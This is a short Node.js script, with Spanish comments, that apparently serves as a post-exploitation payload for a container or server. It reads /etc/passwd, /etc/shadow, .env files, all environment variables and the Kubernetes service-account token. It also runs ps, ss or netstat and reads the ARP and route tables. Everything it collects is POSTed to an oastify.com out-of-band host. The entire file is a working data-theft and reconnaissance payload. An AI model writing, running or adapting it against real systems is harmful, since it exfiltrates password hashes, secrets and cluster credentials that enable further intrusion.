const https = require('https');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

function tryRead(path) {
  try { return fs.readFileSync(path, 'utf8'); } catch(e) { return e.message; }
}

function tryExec(cmd) {
  try { return execSync(cmd).toString(); } catch(e) { return e.message; }
}

const payload = JSON.stringify({
  // Ya tenías esto
  cwd: process.cwd(),
  files: fs.readdirSync(process.cwd()),
  root_files: fs.readdirSync('/'),
  passwd: tryRead('/etc/passwd'),
  interfaces: os.networkInterfaces(),
  env: process.env,
  sysinfo: {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    release: os.release(),
    uptime: os.uptime(),
    totalmem: os.totalmem(),
    freemem: os.freemem(),
    user: os.userInfo()
  },

  // Nuevo — archivos sensibles
  sensitive_files: {
    shadow: tryRead('/etc/shadow'),          // hashes de contraseñas
    hosts: tryRead('/etc/hosts'),            // otros hosts en la red
    resolv: tryRead('/etc/resolv.conf'),     // DNS interno
    docker_env: tryRead('/.dockerenv'),      // confirma si es Docker
    app_env: tryRead('/app/.env'),           // .env del proyecto
    root_env: tryRead('/.env'),
  },

  // Nuevo — procesos y red
  processes: tryExec('ps aux'),
  open_ports: tryExec('ss -tlnp || netstat -tlnp'),
  arp_table: tryExec('cat /proc/net/arp'),  // otros hosts en la red interna
  routes: tryExec('cat /proc/net/route'),   // tabla de rutas

  // Nuevo — Docker/K8s metadata
  docker_inspect: tryRead('/proc/1/cgroup'),
  k8s_token: tryRead('/var/run/secrets/kubernetes.io/serviceaccount/token'),
  k8s_namespace: tryRead('/var/run/secrets/kubernetes.io/serviceaccount/namespace'),

}, null, 2);

const req = https.request('https://y210w5tgyuew2mntw0kvaqnw7nde17pw.oastify.com', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload)
  }
});
req.write(payload);
req.end();
